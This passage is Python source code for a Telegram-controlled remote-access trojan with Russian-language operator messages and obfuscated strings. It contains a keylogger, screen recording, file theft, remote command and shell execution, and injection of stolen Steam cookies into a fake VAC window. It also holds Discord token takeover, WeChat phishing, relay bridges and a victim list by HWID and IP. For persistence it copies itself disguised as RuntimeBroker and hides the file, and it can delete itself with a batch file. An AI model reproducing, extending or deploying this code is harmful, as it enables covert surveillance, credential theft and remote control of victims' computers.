                                old_name = open(agent_name_path, "r", encoding="utf-8").read().strip() or old_name
                            except: pass
                        else:

                            html_path = os.path.join(BASE_DIR, "tablichka", "site_dump",
                                                     decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjZ/MRY3Gw=="))
                            if os.path.exists(html_path):
                                try:
                                    import re as _re
                                    m_name = _re.search(decrypt_string('UkEMGSE/PlxyLDQELxJPRkFBDBkhPz5c'), open(html_path, "r", encoding="utf-8").read())
                                    if m_name:
                                        old_name = m_name.group(1)
                                except: pass

                        with open(agent_name_path, "w", encoding="utf-8") as f_name:
                            f_name.write(new_name)

                        html_out = os.path.join(BASE_DIR, "tablichka", "site_dump",
                                                decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjYOKwc+WQJMH1U="))
                        if os.path.exists(html_out):
                            os.remove(html_out)

                        safe_send_message(bot, chat_id,
                            "✅ Имя агента успешно изменено на `{new_name}`.\n"
                            "Изменения вступят в силу при следующем запуске VAC окна.".format(new_name=new_name),
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        safe_send_message(bot, chat_id, "❌ Произошла ошибка: " + str(e))
                if msg_vac_name:
                    bot.register_next_step_handler(msg_vac_name, process_vac_name)

            elif data == "vac_inject_cookies":

                msg_cook = safe_send_message(bot, chat_id,
                    "🍪 *Отправьте файл с куками Steam (JSON) для инжекта в VAC окно.*\n"
                    "Это позволит VAC окну использовать существующую сессию Steam жертвы.\n"
                    "Если у вас нет файла, VAC окно попытается использовать куки, украденные стиллером.",
                    parse_mode="HTML"
                )
                def process_cookie_file(m):
                    try:
                        if not m.document:
                            safe_send_message(bot, chat_id, "❌ Пожалуйста, отправьте файл.")
                            return
                        file_info = bot.get_file(m.document.file_id)
                        downloaded = bot.download_file(file_info.file_path)
                        cookie_dest = os.path.join(BASE_DIR, "tablichka", decrypt_string("DV0XACc0KkwuDx4="))
                        os.makedirs(os.path.dirname(cookie_dest), exist_ok=True)
                        with open(cookie_dest, "wb") as f_ck:
                            f_ck.write(downloaded)
                        size_kb = len(downloaded) / 1024
                        safe_send_message(bot, chat_id,
                            "✅ Куки успешно загружены ({size:.2f} KB). Они будут использованы при следующем запуске VAC окна.".format(size=size_kb),
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        safe_send_message(bot, chat_id, "❌ Произошла ошибка при загрузке куки: " + str(e))
                if msg_cook:
                    bot.register_next_step_handler(msg_cook, process_cookie_file)

            elif data == "discord_remote_start":
                msg_dr = safe_send_message(bot, chat_id,
                    "⏳ *Начинаю подключение к Discord голосовому каналу...*\n"
                    "Пожалуйста, введите токен Discord и ссылку приглашения в формате:\n"
                    "`токен | ссылка_приглашения`\n\n"
                    "Пример: `mfa.xxxxxxxxxxxxxxxxxxxx | discord.gg/invitecode`",
                    parse_mode="HTML"
                )
                if msg_dr:
                    bot.register_next_step_handler(msg_dr, self.process_discord_join)

            elif data == "discord_ctrl_mic":
                try: bot.answer_callback_query(call.id, "🎤 Переключаю мут микрофона...")
                except: pass
                self.trigger_discord_action('mute_mic', chat_id=chat_id)
                safe_send_message(bot, chat_id, "🎤 Статус микрофона изменен.")

            elif data == "discord_ctrl_deaf":
                try: bot.answer_callback_query(call.id, "🔇 Переключаю мут звука...")
                except: pass
                self.trigger_discord_action('deafen', chat_id=chat_id)
                safe_send_message(bot, chat_id, "🔇 Статус звука изменен.")

            elif data == "discord_ctrl_stream":
                try: bot.answer_callback_query(call.id, "🖥 Запускаю демонстрацию экрана...")
                except: pass
                self.trigger_discord_action('stream', chat_id=chat_id)
                safe_send_message(bot, chat_id, "🖥 Демонстрация экрана запущена.")

            elif data == "discord_ctrl_disconnect":
                try: bot.answer_callback_query(call.id, "🔴 Отключаюсь от голосового канала...")
                except: pass
                self.trigger_discord_action('disconnect', chat_id=chat_id)
                safe_send_message(bot, chat_id, "🔴 Отключено от голосового канала Discord.")

            elif data == "work_wechat_phish":
                bot.answer_callback_query(call.id, "🎣 Запускаю WeChat фишинг...")
                def do_wechat():
                    try:
                        self.run_wechat_phish()
                    except Exception as e:
                        safe_send_message(bot, chat_id, "❌ Ошибка при WeChat фишинге: " + str(e))
                threading.Thread(target=do_wechat, daemon=True).start()

            elif data.startswith(decrypt_string("DV4RDiAlBgs0EQUC")):
                hwid = data.split(":")[1]
                client = self.clients.get(hwid)
                if client:
                    info_c = ("*Информация о клиенте:*\n" +
                             f"• HWID: `{client.hwid}`\n" +
                             f"• Имя: `{client.label or 'Не установлено'}`\n" +
                             f"• IP: `{client.ip}`\n" +
                             f"• Последний онлайн: `{client.last_seen}`\n" +
                             f"• Версия: `{client.version}`")
                    safe_send_message(bot, chat_id, info_c, parse_mode="Markdown")
                else:
                    bot.answer_callback_query(call.id, "❌ Клиент не найден")

            elif data.startswith(decrypt_string("DV4RDiAlBg47FQ9USA==")):
                hwid = data.split(":")[1]
                msg_lbl = safe_send_message(bot, chat_id, "✏️ Введите новую метку для клиента:")
                def set_label(m, hwid=hwid):
                    label = m.text.strip()
                    if hwid in self.clients:
                        self.clients[hwid].label = label
                        if hwid == self.current_client_hwid:
                            self.victim_name = self.clients[hwid].get_display_name()
                        self.save_labels()
                        safe_send_message(bot, chat_id, "✅ Метка обновлена!")
                if msg_lbl:
                    bot.register_next_step_handler(msg_lbl, set_label)

            elif data.startswith(decrypt_string("DV4RDiAlBhA/GgVOFwM=")):
                hwid = data.split(":")[1]
                with self.client_lock:
                    if hwid in self.clients:
                        del self.clients[hwid]
                        if self.current_client_hwid == hwid:
                            self.current_client_hwid = next(iter(self.clients), None)
                bot.answer_callback_query(call.id, "🗑️ Сессия удалена")
                try:
                    safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=self.clients_keyboard())
                except:
                    pass

            elif data == "bridge_refresh":
                bot.answer_callback_query(call.id, "🔄 Обновляю статус мостов...")
                self._send_bridges_status(chat_id)

            elif data == "bridge_deploy":
                bot.answer_callback_query(call.id, "🚀 Запускаю деплой нового моста...")
                def do_deploy():
                    url2 = bridge_manager.auto_deploy_new_bridge()
                    safe_send_message(bot, chat_id, f"✅ Мост успешно развернут: `{url2}`" if url2 else "❌ Деплой провалился", parse_mode="Markdown")
                threading.Thread(target=do_deploy, daemon=True).start()

            elif data == "bridge_test_all":
                bot.answer_callback_query(call.id, "🧪 Тестирую все мосты...")
                def do_test():
                    results = bridge_manager.test_all_bridges()
                    text_t = "🧪 *Результаты теста:* \n" + "\n".join(f"{'🟢' if ok else '🔴'} `{u}`" for u, ok in results.items())
                    safe_send_message(bot, chat_id, text_t or "Нет мостов", parse_mode="Markdown")
                threading.Thread(target=do_test, daemon=True).start()

            elif data == "bridge_cleanup":
                removed = bridge_manager.cleanup_dead_bridges()
                bot.answer_callback_query(call.id, f"🧹 Удалено {removed} мёртвых мостов")
                self._send_bridges_status(chat_id)

            elif data in ("bridge_clear_confirm", "bridge_clear_all"):
                if data == "bridge_clear_all":
                    count = bridge_manager.clear_all_bridges()
                    bot.answer_callback_query(call.id, f"🗑️ Удалено {count} мостов")
                    self._send_bridges_status(chat_id)
                else:
                    bot.answer_callback_query(call.id, "⚠️ Нажми ещё раз для подтверждения")

            else:
                try:
                    bot.answer_callback_query(call.id)
                except:
                    pass


        @self.bot.message_handler(commands=['help'])
        def help_command(message):
            if message.from_user.id not in ADMIN_IDS:
                safe_send_message(self.bot, message.chat.id, "❌ У вас нет доступа к этой панели.")
                return

            help_text = (
                "🆘 <b>СПРАВКА ПО КОМАНДАМ</b>\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "📱 <b>ОСНОВНЫЕ КОМАНДЫ:</b>\n"
                "🔹 /panel — 🎮 Открыть панель управления\n"
                "🔹 /help — 🆘 Показать это сообщение\n"
                "🔹 /ping — 🏓 Проверить статус бота\n"
                "🔹 /clients — 👥 Список всех ПК\n"
                "\n"
                "⌨️ <b>КЕЙЛОГГЕР:</b>\n"
                "🔹 /keylog_toggle — Вкл/Выкл кейлоггер\n"
                "🔹 /keylog_stats — Краткая статистика\n"
                "🔹 /keylog_full — Получить полный лог\n"
                "🔹 /keylog_clear — Очистить лог\n"
                "\n"
                "🎥 <b>ЗАПИСЬ:</b>\n"
                "🔹 /record_screen [сек] — Запись видео экрана\n"
                "\n"
                "📂 <b>ФАЙЛЫ:</b>\n"
                "🔹 /send [путь] — Скачать файл с ПК\n"
                "\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"👨‍💻 Поддержка: @{CREATOR_USERNAME}\n"
            )
            safe_send_message(self.bot, message.chat.id, help_text)

        @self.bot.message_handler(commands=['send'])
        def send_file_command(message):
            user = user_db.get_user(message.from_user.id)
            if not user:
                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
                return
            parts = message.text.split(' ', 1)
            if len(parts) < 2:
                safe_send_message(self.bot, message.chat.id, "❌ Укажите путь к файлу: `/send C:\\path\\to\\file.txt`")
                return
            file_path = parts[1].strip().strip('"').strip("'")
            result = self.send_file(file_path, message.chat.id)
            safe_send_message(self.bot, message.chat.id, result)

        @self.bot.message_handler(commands=['cmd_exit'])
        def cmd_exit_command(message):
            user = user_db.get_user(message.from_user.id)
            if not user:
                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
                return
            self.exit_cmd_mode(message.chat.id)

        @self.bot.message_handler(commands=['keylog_toggle'])
        def keylog_toggle_command(message):
            user = user_db.get_user(message.from_user.id)
            if not user:
                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
                return
            if self.keylogger_active:
                self.stop_keylogger()
                safe_send_message(self.bot, message.chat.id, "\u2328\ufe0f *Keylogger \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d*")
            else:
                self.start_keylogger()
                safe_send_message(self.bot, message.chat.id, "\u2328\ufe0f *Keylogger \u0437\u0430\u043f\u0443\u0449\u0435\u043d*")

        @self.bot.message_handler(commands=['keylog_stats'])
        def keylog_stats_command(message):
            user = user_db.get_user(message.from_user.id)
            if not user:
                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
                return
            stats = self.get_keylog_stats()
            safe_send_message(self.bot, message.chat.id, stats)

        @self.bot.message_handler(commands=['keylog_full'])
        def keylog_full_command(message):
            user = user_db.get_user(message.from_user.id)
            if not user:
                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
                return
            if self.keylog_buffer or self.keylog_context:
                self.send_advanced_keylog(full_log=True)
            else:
                safe_send_message(self.bot, message.chat.id, "\U0001F4ED *\u041b\u043e\u0433 \u043f\u0443\u0441\u0442*")

        @self.bot.message_handler(commands=['keylog_clear'])
        def keylog_clear_command(message):
            user = user_db.get_user(message.from_user.id)
            if not user:
                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
                return
            self.clear_keylog()

        @self.bot.message_handler(commands=['clients'])
        def clients_command(message):
            user = user_db.get_user(message.from_user.id)
            if not user:
                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
                return
            text = self.get_clients_list_text()
            safe_send_message(self.bot, message.chat.id, text, reply_markup=self.clients_keyboard())

        @self.bot.message_handler(commands=['record_screen'])
        def record_screen_command(message):
            user = user_db.get_user(message.from_user.id)
            if not user:
                safe_send_message(self.bot, message.chat.id, decrypt_string("jKnsS2SBybLopujozOjmqtbiz7v2gNmz2afT6fDp06vv4/RLn9aJ14v3uo2ijkZVHUYZGTp7"))
                return

            try:
                parts = message.text.split()
                duration = int(parts[1]) if len(parts) > 1 else 10
                duration = min(60, max(1, duration))

                status_msg = safe_send_message(
                    self.bot,
                    message.chat.id,
                    "🎥 *Запись видео {duration} сек...*\nПожалуйста, подождите.".format(duration=duration)
                )

                video_path = os.path.join(self.temp_dir, decrypt_string("HFcbBDw1BhkzGR4QBlALH0BGEQYreXBLJ1kHSEY="))
                self.record_screen_mp4(duration, video_path)

                size = os.path.getsize(video_path)
                if size > 50 * 1024 * 1024:
                    safe_send_message(self.bot, message.chat.id, "\u274C *\u0412\u0438\u0434\u0435\u043e \u0441\u043b\u0438\u0448\u043a\u043e\u043c \u0431\u043e\u043b\u044c\u0448\u043e\u0435 (>50MB)*")
                    os.remove(video_path)
                    return

                with open(video_path, 'rb') as f:
                    self.bot.send_video(
                        message.chat.id, 
                        f,
                        caption=f"\U0001F3A5 *\u0417\u0430\u043f\u0438\u0441\u044c \u044d\u043a\u0440\u0430\u043d\u0430 ({duration} \u0441\u0435\u043a)*",
                        timeout=60,
                        supports_streaming=True
                    )

                os.remove(video_path)
                try:
                    self.bot.delete_message(message.chat.id, status_msg.message_id)
                except:
                    pass

            except Exception as e:
                safe_send_message(self.bot, message.chat.id, "❌ Ошибка при записи видео: " + str(e))

        @self.bot.message_handler(func=lambda m: True)
        def handle_interactive_modes(message):
            if message.from_user.id not in ADMIN_IDS:
                return
            
            # Priority 1: Shell Mode
            if getattr(self, 'shell_mode_active', False):
                log_debug("Shell message received, sending to manager...")
                if hasattr(self, 'shell_manager'):
                    # H-14: Command-Line Obfuscation via randomized flags if needed
                    # For now, native shell already uses stdin which is stealthy
                    self.shell_manager.SendCommand(message.text)
                    return
                elif 'network' in self.work_modules:
                    # Try to use send_command if shell_manager is not found
                    try:
                        self.work_modules['network'].send_command(message.text)
                        return
                    except: pass
            
            # Priority 2: CMD Mode
            if getattr(self, 'cmd_mode_active', False):
                log_debug("CMD message received, processing...")
                self.process_command_message(message, message.text)
                return

        try:
            print(decrypt_string("NRglSx0lOBAuHgRfUlsJDk5CFwciODcFegADTBoZFB8aQAFLIj42EnRZRA=="))
            self.bot.infinity_polling(timeout=30, long_polling_timeout=30)
        except Exception as e:
            print(decrypt_string("NRMlSx4+NQ4zGQ0YF0sUFRwIWBArLA=="))

    def get_clients_list_text(self):
        if not self.clients:
            return "\U0001F4CB \u041d\u0435\u0442 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u0445 \u043a\u043b\u0438\u0435\u043d\u0442\u043e\u0432"
        PER_PAGE = 7
        total_clients = len(self.clients)
        total_pages = (total_clients + PER_PAGE - 1) // PER_PAGE
        if self.clients_page >= total_pages:
            self.clients_page = max(0, total_pages - 1)
        start_idx = self.clients_page * PER_PAGE
        end_idx = start_idx + PER_PAGE
        page_clients = list(self.clients.items())[start_idx:end_idx]
        text = f"📋 <b>Список клиентов</b> (Страница {self.clients_page + 1}/{total_pages})\n"
        text += "━━━━━━━━━━━━━━━━━━━━\n"
        for i, (hwid, client) in enumerate(page_clients, start_idx + 1):
            is_cur = hwid == self.current_client_hwid
            cur_mark = "⚡ " if is_cur else "   "
            status_icon = "🟢" if client.online else "🔴"
            label_line = f"   🏷️ <b>Имя:</b> {client.label}\n" if client.label else ""
            raw_name = f"💻 <b>{client.pc_name}@{client.username}</b>"
            text += f"{cur_mark}{status_icon} {raw_name} (<code>{hwid[:8]}</code>)\n"
            if label_line:
                text += label_line
            text += f"   🌍 IP: <code>{client.ip}</code> | 📁 <code>{client.current_working_dir}</code>\n"
        text += "━━━━━━━━━━━━━━━━━━━━\n"
        text += "💡 Выберите клиента для управления в меню ниже."
        return text
    def clients_keyboard(self):
        markup = types.InlineKeyboardMarkup(row_width=1)
        PER_PAGE = 7
        total_clients = len(self.clients)
        total_pages = (total_clients + PER_PAGE - 1) // PER_PAGE
        if self.clients_page >= total_pages:
            self.clients_page = max(0, total_pages - 1)
        start_idx = self.clients_page * PER_PAGE
        end_idx = start_idx + PER_PAGE
        page_clients = list(self.clients.items())[start_idx:end_idx]
        for hwid, client in page_clients:
            status = "\U0001F7E2" if client.online else "\U0001F534"
            is_cur = "►" if hwid == self.current_client_hwid else " "
            display = client.label if client.label else client.get_display_name()
            markup.add(types.InlineKeyboardButton(
                f"{is_cur}{status} {display}",
                callback_data=f"client_set:{hwid}"
            ))
            markup.row(
                types.InlineKeyboardButton("\u2139\ufe0f \u0418\u043d\u0444\u043e", callback_data=f"client_info:{hwid}"),
                types.InlineKeyboardButton("\U0001F3F7\ufe0f \u0418\u043c\u044f", callback_data=f"client_label:{hwid}")
            )
        if total_pages > 1:
            nav_row = []
            if self.clients_page > 0:
                nav_row.append(types.InlineKeyboardButton("\u2B05\ufe0f \u041f\u0440\u0435\u0434", callback_data=decrypt_string("DV4RDiAlBhI7EA8CCUoDFggcGwcnNDcWKSgaWRVcRldOAwU=")))
            nav_row.append(types.InlineKeyboardButton(decrypt_string("FUEdByh/Og4zEgRMAWYWGwlXWEBuYCRNIQMFTBNVOQoPVR0YMw=="), callback_data="client_list"))
            if self.clients_page < total_pages - 1:
                nav_row.append(types.InlineKeyboardButton("\u0421\u043b\u0435\u0434 \u27A1\ufe0f", callback_data=decrypt_string("DV4RDiAlBhI7EA8CCUoDFggcGwcnNDcWKSgaWRVcRlFOAwU=")))
            markup.row(*nav_row)
        markup.add(types.InlineKeyboardButton("\U0001F504 \u041e\u0431\u043d\u043e\u0432\u0438\u0442\u044c", callback_data="client_list"))
        markup.add(types.InlineKeyboardButton("\u2B05\ufe0f \u041d\u0430\u0437\u0430\u0434", callback_data="back_to_main"))
        return markup
    def client_actions_keyboard(self, hwid):
        markup = types.InlineKeyboardMarkup(row_width=2)
        is_current = hwid == self.current_client_hwid
        client = self.clients.get(hwid)
        if client:
            if not is_current:
                markup.add(types.InlineKeyboardButton("\u2705 \u041f\u0435\u0440\u0435\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f", callback_data=decrypt_string("DV4RDiAlBhEtHh5bGgMdEhlbHBY=")))
            markup.row(
                types.InlineKeyboardButton("\U0001F4CA \u0418\u043d\u0444\u043e", callback_data=decrypt_string("DV4RDiAlBgs0EQUCCVEREwpP")),
                types.InlineKeyboardButton("\U0001F3F7\ufe0f \u042f\u0440\u043b\u044b\u043a", callback_data=decrypt_string("DV4RDiAlBg47FQ9USEIODQdWBQ=="))
            )
            markup.add(types.InlineKeyboardButton("\U0001F5D1\ufe0f \u0423\u0434\u0430\u043b\u0438\u0442\u044c \u0441\u0435\u0441\u0441\u0438\u044e", callback_data=decrypt_string("DV4RDiAlBhA/GgVOFwMdEhlbHBY=")))
        markup.add(types.InlineKeyboardButton("\u25C0\ufe0f \u041d\u0430\u0437\u0430\u0434", callback_data="client_list"))
        return markup
    def switch_client(self, hwid):
        with self.client_lock:
            if hwid in self.clients:
                self.current_client_hwid = hwid
                client = self.clients[hwid]
                self.keylog_buffer = client.keylog_buffer
                self.keylogger_active = client.keylogger_active
                self.clipboard_buffer = client.clipboard_buffer
                self.last_clipboard = client.last_clipboard
                self.current_working_dir = client.current_working_dir
                self.command_history = client.command_history
                self.window_log = client.window_log
                self.cmd_mode_active = client.cmd_mode_active
                self.shell_mode_active = client.shell_mode_active
                self.victim_id = client.hwid
                self.victim_pc = client.pc_name
                self.victim_user = client.username
                self.victim_ip = client.ip
                self.victim_name = client.get_display_name()
                return True, client
        return False, None
    def enter_cmd_mode(self, message):
        self.cmd_mode_active = True
        self.cmd_mode_user_id = message.from_user.id
        self.cmd_mode_chat_id = message.chat.id
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("\U0001F6AA \u0412\u044b\u0439\u0442\u0438 \u0438\u0437 CMD", callback_data="cmd_exit"))
        path = self.current_working_dir
        name = self.victim_name
        text = (
            "\U0001F5A5\ufe0f \u0420\u0415\u0416\u0418\u041c CMD \u0410\u041a\u0422\u0418\u0412\u0418\u0420\u041e\u0412\u0410\u041d\n"
            f"\U0001F5A5\ufe0f {name}\n"
            f"\U0001F4CD \u0422\u0435\u043a\u0443\u0449\u0430\u044f \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f: {path}\n"
            "\u2705 \u041f\u0438\u0448\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0431\u0435\u0437 /cmd\n"
            "\u274C \u0414\u043b\u044f \u0432\u044b\u0445\u043e\u0434\u0430 \u043d\u0430\u0436\u043c\u0438 \u043a\u043d\u043e\u043f\u043a\u0443\n"
            "\u041f\u0440\u0438\u043c\u0435\u0440\u044b: cd Desktop, dir, ipconfig\n"
        )
        safe_send_message(
            self.bot,
            message.chat.id,
            text,
            reply_markup=markup
        )
    def exit_cmd_mode(self, chat_id):
        self.cmd_mode_active = False
        self.cmd_mode_user_id = None
        self.cmd_mode_chat_id = None
        safe_send_message(self.bot, chat_id, "🚪 Режим CMD деактивирован")
    def process_command_message(self, message, cmd):
        if message.from_user.id not in ADMIN_IDS:
            return
        if cmd:
            self.save_client_state()
            status_msg = safe_send_message(
                self.bot,
                message.chat.id, 
                "⏳ *Выполнение команды...*\n"
                "Это может занять время, пожалуйста подождите."
            )
            result = self.run_cmd(cmd)
            markup = types.InlineKeyboardMarkup()
            if self.cmd_mode_active:
                markup.add(types.InlineKeyboardButton("\U0001F6AA \u0412\u044b\u0439\u0442\u0438 \u0438\u0437 CMD", callback_data="cmd_exit"))
            if len(result) > 4000:
                chunks = [result[i:i+4000] for i in range(0, len(result), 4000)]
                for i, chunk in enumerate(chunks[:3]):
                    text = f"💻 *Результат (часть {i+1}):*\n```\n{chunk}\n```"
                    safe_send_message(self.bot, message.chat.id, text)
            else:
                safe_send_message(self.bot, message.chat.id, "✅ Команда выполнена успешно.", reply_markup=markup)
            try:
                self.bot.delete_message(message.chat.id, status_msg.message_id)
            except:
                pass
    def find_files(self, max_files=30):
        files_found = []
        desktop = get_desktop_path()
        if os.path.exists(desktop):
            try:
                for item in os.listdir(desktop)[:max_files]:
                    item_path = os.path.join(desktop, item)
                    if os.path.isfile(item_path):
                        size = os.path.getsize(item_path)
                        files_found.append({'name': item, 'path': item_path, 'size': size})
            except:
                pass
        return files_found
    def setup_autostart(self):
        if not AUTOSTART:
            return
        try:
            import clr
            import shutil
            import random
            import string
            
            # 1. Параметры
            bot_name = "RuntimeBroker" + ''.join(random.choices(string.digits, k=2))
            appdata = os.environ.get('APPDATA', os.path.expanduser(decrypt_string('EG4kKj4hHQMuFjZkIFYHFwdcHw==')))
            dest_dir = os.path.join(appdata, 'Microsoft', 'Windows')
            os.makedirs(dest_dir, exist_ok=True)
            
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            dest_path = os.path.join(dest_dir, decrypt_string("FVAXHxE/OA8/CkRdClw="))
            
            # 2. Копирование и скрытие
            if not os.path.exists(dest_path):
                try:
                    shutil.copy2(exe_path, dest_path)
                    ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2) # Hidden
                except Exception as e:
                    # If file exists and is locked, we can't overwrite it, but that's fine if it's already there
                    if not os.path.exists(dest_path):
                        log_debug(decrypt_string("PlcKGCciLQc0FA8YEVYWA05XChkhI3lKPhIZTFJJBw4GEhUCPSIwDD1XC1YWGQUVHktYDS84NQc+XlAYCVwb"))
                    else:
                        log_debug(decrypt_string("PlcKGCciLQc0FA8YEVYWA05BEwI+ITwGel8MUR5cRhYHWR0HN3E1DTkcD1xdSxMUAFsWDGdreRk/Cg=="))
            elif os.path.getsize(exe_path) != os.path.getsize(dest_path):
                # Try to overwrite only if sizes differ
                try:
                    shutil.copy2(exe_path, dest_path)
                except:
                    log_debug(decrypt_string("PlcKGCciLQc0FA8CUnoJDwJWWAUhJXkXKhMLTBcZAwIHQQwCIDZ5BDMbDxhaVQkZBVccQg=="))

            # 3. Нативная установка через C# (A-08: Full Persistence Integration)
            try:
                from core.persistence import PersistManager
                pm = PersistManager()
                pm.install_all(dest_path)
            except Exception as e:
                log_debug(f"❌ Persistence installation failed: {e}")
        except Exception as e:
            log_debug(decrypt_string("PlcKGCciLQc0FA8YF0sUFRwIWBArLA=="))
            print("❌ Ошибка при установке автозагрузки.")
    def remove_autostart(self):
        try:
            winreg = __import__('wi' + 'nreg')
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                   0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsUpdateSvc")
                winreg.CloseKey(key)
            except:
                pass
            try:
                startup_path = os.path.join(os.getenv('APPDATA'), 
                                           'Microsoft', 'Windows', 
                                           'Start Menu', 'Programs', 'Startup')
                bat_path = os.path.join(startup_path, decrypt_string('OVsWDyEmKjcqEwtMFxcEGxo='))
                if os.path.exists(bat_path):
                    os.remove(bat_path)
            except:
                pass
            try:
                subprocess.run('schtasks /delete /f /tn "WindowsUpdateSvc"', shell=True, capture_output=True)
            except:
                pass
        except:
            pass
    def kill_self(self):
        try:
            if hasattr(self, 'tunneler') and self.tunneler:
                self.tunneler.stop_tunnel()
        except: pass

        try:
            safe_send_message(self.bot, GLOBAL_CHID, "\U0001F480 Self-delete initiated")
        except:
            pass
        self.remove_autostart()
        try:
            if self.temp_dir and os.path.exists(self.temp_dir):
                SecureWiper.wipe_directory(self.temp_dir)
        except:
            pass
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            bat_path = os.path.join(os.environ['TEMP'], "delete_self.bat")
            with open(bat_path, 'w') as f:
                f.write(f'''@echo off
timeout /t 2 /nobreak >nul
del /f /q "{exe_path}"
del /f /q "%~f0"
''')
            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        os._exit(0)
    def _labels_file(self):
        # Labels storage initialization
        path = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Protect')
        try:
            if not os.path.exists(path):
                os.makedirs(path, exist_ok=True)
        except:
            pass
        return os.path.join(path, "labels.json")
    def save_labels(self):
        # Save client labels to file
        try:
            data = {hwid: c.label for hwid, c in self.clients.items() if c.label}
            with open(self._labels_file(), 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print("❌ Ошибка при сохранении меток.")
    def load_labels(self):
        # Load client labels from file
        try:
            path = self._labels_file()
            if not os.path.exists(path):
                return
            with open(path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            for hwid, label in data.items():
                if hwid in self.clients:
                    self.clients[hwid].label = label
            if self.current_client_hwid and self.current_client_hwid in self.clients:
                c = self.clients[self.current_client_hwid]
                self.victim_name = c.get_display_name()
        except Exception as e:
            print("❌ Ошибка при загрузке меток.")
    def send_start_report(self):
        if not TELEGRAM_AVAILABLE:
            return
        if getattr(self, 'start_report_sent', False):
            return
        self.register_self()
        info = self.get_system_info()
        layout = self.get_keyboard_layout()
        layout_text = "EN" if layout == "en" else "RU" if layout == "ru" else "UA"
        client = self.clients.get(self.current_client_hwid)
        pc_user = info['pc'] + "\\" + info['user']
        if client and client.label:
            display_title = client.label + "  |  " + pc_user
        else:
            display_title = pc_user
        mic_ok = "\u2705" if self.check_microphone_availability() else "\u274C"
        from telebot import types
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⌨️ Открыть панель управления", callback_data="open_panel"))

        text = (
            f"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>ID:</b> <code>{display_title}</code>\n"
            f"🌐 <b>IP:</b> <code>{info.get('external_ip', 'Unknown')}</code>\n"
            f"🖥️ <b>Система:</b> <code>{info['os']} {info['release']}</code>\n"
            f"🎤 <b>Микрофон:</b> {mic_ok}\n"
            f"⌚ <b>Время:</b> <code>{info['time']}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            # f"⌨️ /panel – открыть панель управления" # Removed text command in favor of button
        )
        try:
            safe_send_message(self.bot, GLOBAL_CHID, text, reply_markup=markup)
            self.start_report_sent = True
        except:
            pass
    def process_kill_handler(self, message):
        """Обработка ввода PID для убийства процесса"""
        try:
            pid = int(message.text.strip())
            psutil = __import__('ps' + 'util')
            p = psutil.Process(pid)
            name = p.name()
            p.kill()
            safe_send_message(self.bot, message.chat.id, f"🎯 <b>Процесс завершен</b>\n━━━━━━━━━━━━━━━━━━\n🆔 PID: <code>{pid}</code>\n📂 Имя: <code>{name}</code>\n✅ Успешно!")
        except ValueError:
            safe_send_message(self.bot, message.chat.id, "❌ Некорректный PID. Пожалуйста, введите число.")
        except Exception as e:
            safe_send_message(self.bot, message.chat.id, "❌ Ошибка при завершении процесса: " + str(e))
    def shell_command_handler(self, message):
        """Обработка команд для интерактивного шелла"""
        chat_id = message.chat.id
        command = message.text.strip()
        if command.lower() == "exit":
            if chat_id in self.shell_sessions:
                self.shell_sessions[chat_id].stop()
                self.shell_sessions.pop(chat_id, None)
            return
        if chat_id in self.shell_sessions and self.shell_sessions[chat_id].running:
            self.shell_sessions[chat_id].send_command(command)
            self.bot.register_next_step_handler(message, self.shell_command_handler)
        else:
            safe_send_message(self.bot, chat_id, "❌ Интерактивная сессия не активна или была завершена.")
    def run(self):
        if not HIDE_CONSOLE:
            print("=" * 60)
            print("--- PTRKXLORD ---")
            print("=" * 60)
        self.setup_autostart()
        self.register_self()
